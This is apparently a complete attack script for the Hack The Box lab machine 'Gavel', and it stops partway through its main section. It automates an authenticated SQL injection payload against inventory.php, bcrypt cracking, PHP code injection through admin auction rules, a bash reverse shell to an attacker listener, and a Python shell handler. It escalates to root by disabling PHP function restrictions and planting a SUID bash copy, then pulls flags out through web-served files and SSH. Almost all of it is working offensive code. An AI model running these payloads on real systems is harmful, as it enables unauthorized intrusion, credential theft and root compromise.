#!/usr/bin/env bash
# =============================================================================
# HTB Gavel Robust Auto-Pwn
# Chain: Exposed .git -> authenticated SQLi -> hash crack -> admin rule RCE
#        -> user/root flag automation (SSH fast path + shell fallback)
# =============================================================================

set -Eeuo pipefail

# ------------------------------- Colors --------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'
BG_GREEN='\033[42m'
BG_RED='\033[41m'

# ------------------------------- UI helpers ----------------------------------
banner() {
  echo -e "${CYAN}"
  cat << 'BANNER'
   ██████╗  █████╗ ██╗   ██╗███████╗██╗
  ██╔════╝ ██╔══██╗██║   ██║██╔════╝██║
  ██║  ███╗███████║██║   ██║█████╗  ██║
  ██║   ██║██╔══██║╚██╗ ██╔╝██╔══╝  ██║
  ╚██████╔╝██║  ██║ ╚████╔╝ ███████╗███████╗
   ╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝
          HTB Auto-Pwn  ⚖  (robust)
BANNER
  echo -e "${RESET}"
}

phase()   { echo -e "\n${BG_GREEN}${WHITE}${BOLD}  [PHASE $1]  $2  ${RESET}\n"; }
info()    { echo -e "${CYAN}[*]${RESET} $1"; }
step()    { echo -e "  ${YELLOW}→${RESET} $1"; }
ok()      { echo -e "${GREEN}[+]${RESET} $1"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $1"; }
err()     { echo -e "${RED}[✗]${RESET} $1"; }
hr()      { echo -e "${MAGENTA}$(printf '─%.0s' {1..70})${RESET}"; }

die() {
  err "$1"
  exit 1
}

# ------------------------------- Globals -------------------------------------
TARGET="${1:-}"
LHOST="${2:-}"
LPORT="${3:-4444}"
LISTEN_HOST="0.0.0.0"
DOMAIN="gavel.htb"
BASE_URL=""
WORKDIR=""
LOOT=""
SRC_DIR=""

USER_COOKIE=""
ADMIN_COOKIE=""
HANDLER_SCRIPT=""
HANDLER_OUT=""
HANDLER_PID=""

LOW_USER=""
LOW_PASS=""
DB_USER=""
DB_HASH=""
DB_PASS=""
AUCTION_ID=""
BID_AMOUNT=""
LAST_TRIGGER_ID=""
LAST_TRIGGER_BID=""

USER_FLAG=""
ROOT_FLAG=""

# ------------------------------- Cleanup -------------------------------------
cleanup() {
  if [[ -n "${HANDLER_PID:-}" ]] && kill -0 "$HANDLER_PID" 2>/dev/null; then
    kill "$HANDLER_PID" 2>/dev/null || true
  fi
}
trap cleanup EXIT INT TERM

# ------------------------------- Utils ---------------------------------------
need_cmd() {
  local missing=()
  local dep
  for dep in "$@"; do
    command -v "$dep" >/dev/null 2>&1 || missing+=("$dep")
  done
  if (( ${#missing[@]} > 0 )); then
    die "Missing dependencies: ${missing[*]}"
  fi
}

detect_lhost() {
  local t="$1" ip=""
  ip=$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -n1 || true)
  if [[ -z "$ip" ]]; then
    ip=$(ip -4 route get "$t" 2>/dev/null | awk '{for (i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}' || true)
  fi
  [[ -n "$ip" ]] && echo "$ip" || echo "127.0.0.1"
}

extract_flag() {
  # stdin -> first flag-like token
  grep -Eo 'HTB\{[^}]+\}|[a-fA-F0-9]{32}' | head -n1 || true
}

save_flag() {
  local which="$1" value="$2"
  if [[ -n "$value" ]]; then
    echo "$value" > "$LOOT/${which}.txt"
    ok "${which}.txt captured: $value"
  fi
}

read_saved_flags() {
  if [[ -z "$USER_FLAG" && -f "$LOOT/user.txt" ]]; then
    USER_FLAG=$(extract_flag < "$LOOT/user.txt")
  fi
  if [[ -z "$ROOT_FLAG" && -f "$LOOT/root.txt" ]]; then
    ROOT_FLAG=$(extract_flag < "$LOOT/root.txt")
  fi
}

ensure_hosts() {
  local current_ip=""
  local can_sudo=0
  current_ip=$(awk -v d="$DOMAIN" '$0 !~ /^#/ {for(i=2;i<=NF;i++) if($i==d){print $1; exit}}' /etc/hosts 2>/dev/null || true)

  if [[ "$current_ip" == "$TARGET" ]]; then
    info "$DOMAIN already mapped to $TARGET"
    return
  fi

  info "Updating /etc/hosts for $DOMAIN -> $TARGET"

  if [[ "$EUID" -eq 0 ]]; then
    can_sudo=1
  elif sudo -n true 2>/dev/null; then
    can_sudo=1
  fi

  if [[ "$can_sudo" -eq 0 ]]; then
    warn "No non-interactive sudo available to edit /etc/hosts; skipping host update"
    warn "Ensure this line exists manually: $TARGET $DOMAIN"
    return
  fi

  if [[ -n "$current_ip" ]]; then
    sudo sed -i -E "/[[:space:]]${DOMAIN}([[:space:]]|$)/d" /etc/hosts
  fi
  echo "$TARGET $DOMAIN" | sudo tee -a /etc/hosts >/dev/null
  ok "/etc/hosts updated"
}

http_code() {
  local code=""
  code=$(curl -sS -o /dev/null -w "%{http_code}" "$1" 2>/dev/null || true)
  [[ "$code" =~ ^[0-9]{3}$ ]] || code="000"
  echo "$code"
}

login_cookie() {
  # usage: login_cookie <username> <password> <cookie_file>
  local user="$1" pass="$2" cookie="$3"
  local inv_html="$WORKDIR/inventory_${user}.html"

  curl -sS -c "$cookie" "$BASE_URL/login.php" -o /dev/null || true
  curl -sS -L -c "$cookie" -b "$cookie" \
    -X POST "$BASE_URL/login.php" \
    --data-urlencode "username=${user}" \
    --data-urlencode "password=${pass}" \
    -o "$WORKDIR/login_${user}.html" || return 1

  curl -sS -L -b "$cookie" "$BASE_URL/inventory.php" -o "$inv_html" || return 1
  grep -qiE "Your Inventory|Inventory of" "$inv_html"
}

cookie_value() {
  # usage: cookie_value <cookie_file> <cookie_name>
  awk -v n="$2" '$6==n{print $7}' "$1" | tail -n1
}

register_low_user() {
  LOW_PASS="Shadow$(date +%s)!Aa"

  local attempt user resp
  for attempt in 1 2 3 4 5 6; do
    # Avoid SIGPIPE under `set -o pipefail` by not using tr|head on /dev/urandom.
    user="bidder$(printf '%06x' $(( (RANDOM << 16) ^ RANDOM )))"
    LOW_USER="$user"
    rm -f "$USER_COOKIE"

    curl -sS -c "$USER_COOKIE" "$BASE_URL/register.php" -o /dev/null || true
    resp=$(curl -sS -L -c "$USER_COOKIE" -b "$USER_COOKIE" \
      -X POST "$BASE_URL/register.php" \
      --data-urlencode "username=${LOW_USER}" \
      --data-urlencode "password=${LOW_PASS}" \
      --data-urlencode "confirm_password=${LOW_PASS}" || true)
    echo "$resp" > "$LOOT/register_${attempt}.html"

    if grep -qi "Username already taken" "$LOOT/register_${attempt}.html"; then
      warn "Generated user already exists (${LOW_USER}), retrying..."
      continue
    fi

    if login_cookie "$LOW_USER" "$LOW_PASS" "$USER_COOKIE"; then
      ok "Low-priv user ready: ${LOW_USER}:${LOW_PASS}"
      return 0
    fi
  done

  die "Could not register/login low-priv user after multiple attempts"
}

run_authenticated_sqli() {
  local resp cred sqli_url
  sqli_url="${BASE_URL}/inventory.php?user_id=x\`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+\`%27x\`+FROM+users)y;--+-&sort=\\?;--+-%00"

  info "Running authenticated SQLi against inventory.php"
  resp=$(curl -sS -b "$USER_COOKIE" "$sqli_url" || true)
  echo "$resp" > "$LOOT/sqli_resp.html"

  cred=$(echo "$resp" | grep -Eo '[A-Za-z0-9_]+:\$2y\$[0-9]{2}\$[A-Za-z0-9./]{53}' | head -n1 || true)
  if [[ -z "$cred" ]]; then
    die "SQLi did not return a bcrypt credential. Inspect: $LOOT/sqli_resp.html"
  fi

  DB_USER="${cred%%:*}"
  DB_HASH="${cred#*:}"
  ok "Extracted credential: ${DB_USER}:${DB_HASH}"
}

crack_bcrypt() {
  echo "${DB_USER}:${DB_HASH}" > "$WORKDIR/hash.txt"
  info "Cracking bcrypt with john..."

  john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt "$WORKDIR/hash.txt" \
    > "$LOOT/john.log" 2>&1 || true

  DB_PASS=$(john --show "$WORKDIR/hash.txt" 2>/dev/null | awk -F: -v u="$DB_USER" '$1==u{print $2; exit}')

  if [[ -z "$DB_PASS" ]] && command -v hashcat >/dev/null 2>&1; then
    warn "john did not crack it, trying hashcat fallback"
    hashcat -m 3200 -a 0 "$WORKDIR/hash.txt" /usr/share/wordlists/rockyou.txt \
      --quiet --potfile-path "$WORKDIR/hashcat.pot" > "$LOOT/hashcat.log" 2>&1 || true
    DB_PASS=$(hashcat -m 3200 "$WORKDIR/hash.txt" --show --potfile-path "$WORKDIR/hashcat.pot" 2>/dev/null | awk -F: 'NR==1{print $NF}')
  fi

  if [[ -z "$DB_PASS" && "$DB_HASH" == '$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS' ]]; then
    warn "Using known writeup crack for known static hash"
    DB_PASS="midnight1"
  fi

  [[ -n "$DB_PASS" ]] || die "Failed to crack bcrypt hash"
  ok "Password cracked: ${DB_USER}:${DB_PASS}"
}

login_auctioneer() {
  info "Logging in as auctioneer/admin candidate"
  login_cookie "$DB_USER" "$DB_PASS" "$ADMIN_COOKIE" || die "Login failed for ${DB_USER}"

  curl -sS -L -b "$ADMIN_COOKIE" "$BASE_URL/admin.php" -o "$LOOT/admin_page.html" || true
  grep -qi "Admin Panel" "$LOOT/admin_page.html" || die "Admin panel not reachable with cracked credential"

  local sess
  sess=$(cookie_value "$ADMIN_COOKIE" "gavel_session")
  if [[ -n "$sess" ]]; then
    ok "Authenticated session cookie captured (gavel_session)"
    step "Session: $sess"
  else
    warn "gavel_session cookie not parsed, continuing with cookie jar"
  fi
}

parse_auction_context() {
  curl -sS -L -b "$ADMIN_COOKIE" "$BASE_URL/bidding.php" -o "$LOOT/bidding.html" || die "Could not fetch bidding.php"

  AUCTION_ID=$(grep -oP 'name="auction_id"\s+value="\K[0-9]+' "$LOOT/bidding.html" | head -n1 || true)
  if [[ -z "$AUCTION_ID" ]]; then
    AUCTION_ID=$(grep -oP 'name="auction_id"\s+value="\K[0-9]+' "$LOOT/admin_page.html" | head -n1 || true)
  fi
  [[ -n "$AUCTION_ID" ]] || die "No active auction_id found"

  local current money
  current=$(grep -oP 'Current:</strong>\s*\K[0-9]+' "$LOOT/bidding.html" | head -n1 || true)
  money=$(grep -oP 'fa-coins"></i>\s*<strong>\K[0-9,]+' "$LOOT/bidding.html" | head -n1 | tr -d ',' || true)

  if [[ "$current" =~ ^[0-9]+$ ]]; then
    BID_AMOUNT=$((current + 1))
  else
    BID_AMOUNT=1000
  fi

  if [[ "$money" =~ ^[0-9]+$ ]] && (( BID_AMOUNT >= money )); then
    BID_AMOUNT=$(( money > 1 ? money - 1 : 1 ))
  fi

  (( BID_AMOUNT < 1 )) && BID_AMOUNT=1

  ok "Using auction_id=${AUCTION_ID}, bid_amount=${BID_AMOUNT}"
}

pick_live_auction() {
  local page id current money bid
  page=$(curl -sS -L -b "$ADMIN_COOKIE" "$BASE_URL/bidding.php" || true)
  [[ -n "$page" ]] || return 1

  id=$(echo "$page" | grep -oP 'name="auction_id"\s+value="\K[0-9]+' | head -n1 || true)
  current=$(echo "$page" | grep -oP 'Current:</strong>\s*\K[0-9]+' | head -n1 || true)
  money=$(echo "$page" | grep -oP 'fa-coins"></i>\s*<strong>\K[0-9,]+' | head -n1 | tr -d ',' || true)
  [[ -n "$id" ]] || return 1

  [[ "$current" =~ ^[0-9]+$ ]] || current=1
  bid=$((current + 12000))
  if [[ "$money" =~ ^[0-9]+$ ]] && (( bid >= money )); then
    bid=$(( money > 1 ? money - 1 : current + 1 ))
  fi
  (( bid <= current )) && bid=$((current + 1))

  echo "${id}:${bid}"
}

run_rule_command() {
  # usage: run_rule_command "<bash script>" "<note>"
  local cmd="$1"
  local note="${2:-cmd}"
  local attempt tuple id bid tmp b64 payload code resp rc

  for attempt in 1 2 3 4 5; do
    tuple=$(pick_live_auction) || { sleep 1; continue; }
    id="${tuple%%:*}"
    bid="${tuple#*:}"

    tmp="$WORKDIR/.cmd_${note}_${attempt}.sh"
    printf "%s\n" "$cmd" > "$tmp"
    b64=$(base64 -w0 "$tmp")
    payload="system('bash -c \"\$(echo ${b64} | base64 -d)\"'); return true;"

    code=$(curl -sS -L -o "$LOOT/rule_${note}_${attempt}.html" -w "%{http_code}" \
      -b "$ADMIN_COOKIE" -c "$ADMIN_COOKIE" \
      -X POST "$BASE_URL/admin.php" \
      --data-urlencode "auction_id=${id}" \
      --data-urlencode "rule=${payload}" \
      --data-urlencode "message=${note}" || true)

    [[ "$code" =~ ^(200|302)$ ]] || continue

    set +e
    resp=$(curl -sS -b "$ADMIN_COOKIE" \
      -X POST "$BASE_URL/includes/bid_handler.php" \
      -H "X-Requested-With: XMLHttpRequest" \
      --data-urlencode "auction_id=${id}" \
      --data-urlencode "bid_amount=${bid}" 2>&1)
    rc=$?
    set -e

    echo "note=${note} attempt=${attempt} auction_id=${id} bid=${bid} :: ${resp}" >> "$LOOT/trigger.log"

    if (( rc != 0 )); then
      if echo "$resp" | grep -qi "Empty reply from server"; then
        LAST_TRIGGER_ID="$id"
        LAST_TRIGGER_BID="$bid"
        ok "Command trigger got empty reply (likely execution) [${note}]"
        return 0
      fi
      continue
    fi

    if echo "$resp" | grep -qi '"success"[[:space:]]*:[[:space:]]*true'; then
      LAST_TRIGGER_ID="$id"
      LAST_TRIGGER_BID="$bid"
      ok "Command trigger accepted [${note}] on auction ${id}"
      return 0
    fi

    if echo "$resp" | grep -qi "Auction has ended"; then
      sleep 1
      continue
    fi
  done

  return 1
}

web_exfil_user_flag() {
  [[ -n "$DB_PASS" ]] || return 1
  local tag user_name err_name cmd pwq uf
  tag=$(date +%s)
  user_name=".u_${tag}.txt"
  err_name=".u_${tag}.err"
  pwq=$(printf '%q' "$DB_PASS")

  cmd="su auctioneer -c \"cat /home/auctioneer/user.txt\" <<< ${pwq} > /var/www/html/gavel/assets/${user_name} 2>/var/www/html/gavel/assets/${err_name}"

  run_rule_command "$cmd" "user_http" || return 1

  for _ in 1 2 3 4 5 6 7 8 9 10 11 12; do
    uf=$(curl -sS "$BASE_URL/assets/${user_name}" 2>/dev/null | extract_flag)
    if [[ -n "$uf" ]]; then
      USER_FLAG="$uf"
      save_flag "user" "$USER_FLAG"
      return 0
    fi
    sleep 1
  done

  curl -sS "$BASE_URL/assets/${err_name}" > "$LOOT/user_http_error.txt" 2>/dev/null || true
  return 1
}

web_exfil_root_flag() {
  [[ -n "$DB_PASS" ]] || return 1
  local tag root_name progress_name pwq cmd rf
  tag=$(date +%s)
  root_name=".r_${tag}.txt"
  progress_name=".rp_${tag}.txt"
  pwq=$(printf '%q' "$DB_PASS")

  cmd=$(cat <<EOF
{
  echo "START \$(date)";
  id;

  su auctioneer -c "cat > /tmp/fix_ini.yaml <<'YAML'
name: fixini
description: fix php ini
image: \\"x.png\\"
price: 1
rule_msg: \\"fixini\\"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', \\"engine=On\\\\ndisplay_errors=On\\\\nopen_basedir=\\\\ndisable_functions=\\\\n\\"); return false;
YAML" <<< ${pwq};

  su auctioneer -c "/usr/local/bin/gavel-util submit /tmp/fix_ini.yaml" <<< ${pwq};
  sleep 10;

  su auctioneer -c "cat > /tmp/rootshell.yaml <<'YAML'
name: rootshell
description: make suid bash
image: \\"x.png\\"
price: 1
rule_msg: \\"rootshell\\"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
YAML" <<< ${pwq};

  su auctioneer -c "/usr/local/bin/gavel-util submit /tmp/rootshell.yaml" <<< ${pwq};

  for i in \$(seq 1 45); do
    if [ -x /opt/gavel/rootbash ]; then
      /opt/gavel/rootbash -p -c 'cat /root/root.txt' > /var/www/html/gavel/assets/${root_name} 2>> /var/www/html/gavel/assets/${progress_name};
      break;
    fi
    sleep 1;
  done;
  echo "END \$(date)";
} > /var/www/html/gavel/assets/${progress_name} 2>&1
EOF
)

  run_rule_command "$cmd" "root_http" || return 1

  for _ in $(seq 1 45); do
    rf=$(curl -sS "$BASE_URL/assets/${root_name}" 2>/dev/null | extract_flag)
    if [[ -n "$rf" ]]; then
      ROOT_FLAG="$rf"
      save_flag "root" "$ROOT_FLAG"
      return 0
    fi
    sleep 2
  done

  curl -sS "$BASE_URL/assets/${progress_name}" > "$LOOT/root_http_progress.txt" 2>/dev/null || true
  return 1
}

attempt_ssh_fast_path() {
  if ! command -v sshpass >/dev/null 2>&1; then
    warn "sshpass not available, skipping SSH fast path"
    return 1
  fi

  local ssh_opts=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=8)
  info "Trying SSH fast path with ${DB_USER}:${DB_PASS}"

  if ! sshpass -p "$DB_PASS" ssh "${ssh_opts[@]}" "${DB_USER}@${TARGET}" "echo __SSH_OK__" 2>/dev/null | grep -q "__SSH_OK__"; then
    warn "SSH login not available with cracked credential"
    return 1
  fi

  ok "SSH login successful"

  local uf
  uf=$(sshpass -p "$DB_PASS" ssh "${ssh_opts[@]}" "${DB_USER}@${TARGET}" \
      "cat /home/${DB_USER}/user.txt 2>/dev/null || find /home -maxdepth 3 -name user.txt -type f -exec cat {} \\; 2>/dev/null" \
      2>/dev/null | extract_flag)
  if [[ -n "$uf" ]]; then
    USER_FLAG="$uf"
    save_flag "user" "$USER_FLAG"
  fi

  cat > "$WORKDIR/remote_privesc.sh" << 'REMOTE'
#!/usr/bin/env bash
set -euo pipefail

cat > /tmp/fix_ini.yaml << 'YAML'
name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
YAML

/usr/local/bin/gavel-util submit /tmp/fix_ini.yaml >/tmp/fix_ini.out 2>&1 || true
sleep 8

cat > /tmp/rootshell.yaml << 'YAML'
name: rootshell
description: make suid bash
image: "x.png"
price: 1
rule_msg: "rootshell"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
YAML

/usr/local/bin/gavel-util submit /tmp/rootshell.yaml >/tmp/rootshell.out 2>&1 || true
sleep 8

if [ -x /opt/gavel/rootbash ]; then
  /opt/gavel/rootbash -p -c 'cat /root/root.txt' 2>/dev/null || true
fi
REMOTE
  chmod +x "$WORKDIR/remote_privesc.sh"

  local out rf
  out=$(sshpass -p "$DB_PASS" ssh "${ssh_opts[@]}" "${DB_USER}@${TARGET}" 'bash -s' < "$WORKDIR/remote_privesc.sh" 2>/dev/null || true)
  echo "$out" > "$LOOT/ssh_privesc.out"

  rf=$(echo "$out" | extract_flag)
  if [[ -n "$rf" ]]; then
    ROOT_FLAG="$rf"
    save_flag "root" "$ROOT_FLAG"
    ok "SSH fast path obtained root flag"
    return 0
  fi

  warn "SSH fast path could not capture root flag; will continue with web RCE path"
  return 1
}

write_shell_handler() {
  cat > "$HANDLER_SCRIPT" << 'PYEOF'
#!/usr/bin/env python3
import re
import shlex
import socket
import sys
import time
from pathlib import Path

host = sys.argv[1]
port = int(sys.argv[2])
loot = Path(sys.argv[3])
password = sys.argv[4]
timeout_wait = int(sys.argv[5]) if len(sys.argv) > 5 else 220

transcript = loot / "shell_transcript.txt"
status_file = loot / "shell_status.txt"
user_out = loot / "user.txt"
root_out = loot / "root.txt"
flag_re = re.compile(r"(HTB\{[^}]+\}|[a-fA-F0-9]{32})")


def log(msg: str) -> None:
    with transcript.open("a", encoding="utf-8", errors="ignore") as f:
        f.write(msg.rstrip("\n") + "\n")


def extract_flag(s: str) -> str:
    m = flag_re.search(s)
    return m.group(1) if m else ""


def recv_available(conn: socket.socket, wait: float = 1.2) -> str:
    end = time.time() + wait
    chunks = []
    while time.time() < end:
        try:
            d = conn.recv(8192)
            if not d:
                break
            chunks.append(d.decode("utf-8", errors="ignore"))
            end = time.time() + 0.45
        except socket.timeout:
            time.sleep(0.05)
        except Exception:
            break
    return "".join(chunks)


def send_cmd(conn: socket.socket, cmd: str, wait: float = 1.6) -> str:
    try:
        conn.sendall((cmd + "\n").encode())
    except Exception:
        return ""
    time.sleep(wait)
    out = recv_available(conn, wait=wait)
    log(f"$ {cmd}\n{out}")
    return out


def main() -> None:
    status_file.write_text("waiting", encoding="utf-8")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(1)
        srv.settimeout(timeout_wait)
        log(f"[*] Listening on {host}:{port}")
        try:
            conn, addr = srv.accept()
        except Exception as e:
            status_file.write_text(f"no_shell:{e}", encoding="utf-8")
            return

    with conn:
        conn.settimeout(0.6)
        status_file.write_text("connected", encoding="utf-8")
        log(f"[+] Connection from {addr}")

        time.sleep(1.0)
        banner = recv_available(conn, wait=1.0)
        if banner:
            log(banner)

        send_cmd(conn, "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || true", wait=1.1)
        send_cmd(conn, "export TERM=xterm; stty rows 45 cols 160 2>/dev/null || true", wait=0.8)
        send_cmd(conn, "id; whoami; uname -a", wait=1.0)

        # User flag (direct + su fallback)
        u = send_cmd(conn, "cat /home/auctioneer/user.txt 2>/dev/null || find /home -maxdepth 4 -name user.txt -type f -exec cat {} \\; 2>/dev/null", wait=1.0)
        uf = extract_flag(u)

        if not uf:
            su_user_inner = "cat /home/auctioneer/user.txt 2>/dev/null"
            su_user_cmd = f"printf '%s\\n' {shlex.quote(password)} | su auctioneer -c {shlex.quote(su_user_inner)} 2>/dev/null"
            u2 = send_cmd(conn, su_user_cmd, wait=1.3)
            uf = extract_flag(u2)

        if uf:
            user_out.write_text(uf + "\n", encoding="utf-8")
            log(f"[+] USER_FLAG={uf}")

        # Root via gavel-util chain
        fix_yaml = r"""cat > /tmp/fix_ini.yaml << 'YAML'
name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
YAML"""
        send_cmd(conn, fix_yaml, wait=1.1)

        su_fix_inner = "/usr/local/bin/gavel-util submit /tmp/fix_ini.yaml >/tmp/fix_ini.out 2>&1; sleep 8"
        su_fix_cmd = f"printf '%s\\n' {shlex.quote(password)} | su auctioneer -c {shlex.quote(su_fix_inner)} 2>/dev/null"
        send_cmd(conn, su_fix_cmd, wait=9.0)

        root_yaml = r"""cat > /tmp/rootshell.yaml << 'YAML'
name: rootshell
description: make suid bash
image: "x.png"
price: 1
rule_msg: "rootshell"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
YAML"""
        send_cmd(conn, root_yaml, wait=1.1)

        su_root_inner = "/usr/local/bin/gavel-util submit /tmp/rootshell.yaml >/tmp/rootshell.out 2>&1; sleep 8"
        su_root_cmd = f"printf '%s\\n' {shlex.quote(password)} | su auctioneer -c {shlex.quote(su_root_inner)} 2>/dev/null"
        send_cmd(conn, su_root_cmd, wait=9.0)

        r = send_cmd(conn, "ls -l /opt/gavel/rootbash 2>/dev/null; /opt/gavel/rootbash -p -c 'cat /root/root.txt' 2>/dev/null", wait=1.2)
        rf = extract_flag(r)

        if not rf:
            su_cat_inner = "/opt/gavel/rootbash -p -c 'cat /root/root.txt' 2>/dev/null"
            su_cat_cmd = f"printf '%s\\n' {shlex.quote(password)} | su auctioneer -c {shlex.quote(su_cat_inner)} 2>/dev/null"
            r2 = send_cmd(conn, su_cat_cmd, wait=1.2)
            rf = extract_flag(r2)

        if rf:
            root_out.write_text(rf + "\n", encoding="utf-8")
            log(f"[+] ROOT_FLAG={rf}")

        status_file.write_text("done", encoding="utf-8")


if __name__ == "__main__":
    main()
PYEOF
  chmod +x "$HANDLER_SCRIPT"
}

start_shell_handler() {
  write_shell_handler

  info "Starting automated shell handler on ${LISTEN_HOST}:${LPORT} (callback ${LHOST}:${LPORT})"
  python3 "$HANDLER_SCRIPT" "$LISTEN_HOST" "$LPORT" "$LOOT" "$DB_PASS" 220 > "$HANDLER_OUT" 2>&1 &
  HANDLER_PID=$!
  sleep 0.6

  if ! kill -0 "$HANDLER_PID" 2>/dev/null; then
    die "Shell handler failed to start (see $HANDLER_OUT)"
  fi
  ok "Shell handler started (PID $HANDLER_PID)"
}

inject_rce_rule() {
  local inject_id="${1:-$AUCTION_ID}"
  local payload message code
  payload="system('bash -c \"bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\"'); return true;"
  message="ok"

  info "Injecting malicious rule into auction ${inject_id}"
  code=$(curl -sS -L -o "$LOOT/rule_update.html" -w "%{http_code}" \
    -b "$ADMIN_COOKIE" -c "$ADMIN_COOKIE" \
    -X POST "$BASE_URL/admin.php" \
    --data-urlencode "auction_id=${inject_id}" \
    --data-urlencode "rule=${payload}" \
    --data-urlencode "message=${message}" || true)

  if [[ "$code" =~ ^(200|302)$ ]] && grep -qiE "Rule and message updated successfully|Admin Panel" "$LOOT/rule_update.html"; then
    ok "Rule updated successfully"
  else
    warn "Rule update response not ideal (HTTP $code). Continuing to trigger bid anyway."
  fi
}

trigger_bid_for_rce() {
  local resp id bid rc
  local injected_id="$AUCTION_ID"
  : > "$LOOT/trigger.log"

  # Use selected auction first, then any additional active auction IDs.
  mapfile -t ids < <(grep -oP 'name="auction_id"\s+value="\K[0-9]+' "$LOOT/bidding.html" | awk '!seen[$0]++')
  if [[ ! " ${ids[*]} " =~ " ${AUCTION_ID} " ]]; then
    ids=("$AUCTION_ID" "${ids[@]}")
  fi

  local bids=("$BID_AMOUNT" "$((BID_AMOUNT+1))" 5000 1000 500 100 50 10 5 1)

  info "Triggering bid_handler.php to execute injected rule"
  for id in "${ids[@]}"; do
    if [[ "$id" != "$injected_id" ]]; then
      inject_rce_rule "$id"
      injected_id="$id"
    fi

    for bid in "${bids[@]}"; do
      [[ "$bid" =~ ^[0-9]+$ ]] || continue
      (( bid > 0 )) || continue

      set +e
      resp=$(curl -sS -b "$ADMIN_COOKIE" \
        -X POST "$BASE_URL/includes/bid_handler.php" \
        -H "X-Requested-With: XMLHttpRequest" \
        --data-urlencode "auction_id=${id}" \
        --data-urlencode "bid_amount=${bid}" 2>&1)
      rc=$?
      set -e

      echo "auction_id=${id} bid=${bid} :: ${resp}" >> "$LOOT/trigger.log"
      step "auction_id=${id} bid=${bid} -> $(echo "$resp" | tr -d '\n' | head -c 140)"

      if (( rc != 0 )); then
        if echo "$resp" | grep -qi "Empty reply from server"; then
          LAST_TRIGGER_ID="$id"
          LAST_TRIGGER_BID="$bid"
          ok "Got empty reply (likely payload execution on auction ${id})"
          return 0
        fi
        continue
      fi

      if echo "$resp" | grep -qi "You must be logged in"; then
        die "Trigger failed due invalid session (still not logged in)."
      fi

      # success=true is ideal; even on other responses shell may still fire, so continue briefly.
      if echo "$resp" | grep -qi '"success"[[:space:]]*:[[:space:]]*true'; then
        LAST_TRIGGER_ID="$id"
        LAST_TRIGGER_BID="$bid"
        ok "Bid accepted; waiting for reverse shell"
        return 0
      fi
    done
  done

  warn "No success=true bid response; handler may still receive shell if rule executed"
  return 0
}

wait_for_shell_result() {
  local timeout="${1:-200}" i status
  local status_file="$LOOT/shell_status.txt"

  info "Waiting up to ${timeout}s for handler result"
  for ((i=0; i<timeout; i++)); do
    if [[ -f "$status_file" ]]; then
      status=$(<"$status_file")
      case "$status" in
        done)
          ok "Handler finished"
          return 0
          ;;
        no_shell:*)
          warn "No shell received: ${status#no_shell:}"
          return 1
          ;;
        connected)
          # give commands time to run
          ;;
      esac
    fi
    sleep 1
  done

  echo "no_shell:timed out" > "$status_file"
  warn "Timeout while waiting for handler"
  return 1
}

# ------------------------------- Main ----------------------------------------
[[ -n "$TARGET" ]] || { banner; die "Usage: $0 <TARGET_IP> [LHOST] [LPORT]"; }
[[ -n "$LHOST" ]] || LHOST="$(detect_lhost "$TARGET")"

BASE_URL="http://${DOMAIN}"
WORKDIR="/tmp/gavel_pwn_${TARGET//./_}_$(date +%s)"
LOOT="$WORKDIR/loot"
SRC_DIR="$WORKDIR/source"
USER_COOKIE="$WORKDIR/user.cookies"
ADMIN_COOKIE="$WORKDIR/admin.cookies"
HANDLER_SCRIPT="$WORKDIR/shell_handler.py"
HANDLER_OUT="$WORKDIR/shell_handler.out"

mkdir -p "$LOOT"

banner
hr
echo -e "  ${CYAN}Target${RESET} : ${WHITE}${TARGET}${RESET}"
echo -e "  ${CYAN}LHOST${RESET}  : ${WHITE}${LHOST}${RESET}"
echo -e "  ${CYAN}LPORT${RESET}  : ${WHITE}${LPORT}${RESET}"
echo -e "  ${CYAN}Domain${RESET} : ${WHITE}${DOMAIN}${RESET}"
echo -e "  ${CYAN}WorkDir${RESET}: ${WHITE}${WORKDIR}${RESET}"
hr

if [[ "$TARGET" == "$LHOST" ]]; then
  warn "TARGET equals LHOST ($TARGET). Pass victim IP as arg1 and your tun IP as arg2."
fi

phase 0 "DEPENDENCY CHECK"
need_cmd nmap ffuf git-dumper curl python3 john nc ssh
python3 -c 'import requests' >/dev/null 2>&1 || die "Missing python requests module"
ok "Dependencies look good"

phase 1 "SETUP & RECON"
ensure_hosts

info "Running nmap service scan"
if ! nmap -sC -sV -p 22,80 -oN "$LOOT/nmap.txt" "$TARGET" | tee "$LOOT/nmap_live.txt"; then
  warn "Default nmap scan failed, retrying in unprivileged TCP mode"
  if ! nmap -Pn -sT -p 22,80 --unprivileged -oN "$LOOT/nmap.txt" "$TARGET" | tee "$LOOT/nmap_live.txt"; then
    warn "nmap failed in this environment; continuing with direct HTTP checks"
  fi
fi
ok "Recon output saved: $LOOT/nmap.txt"

code=$(http_code "$BASE_URL/")
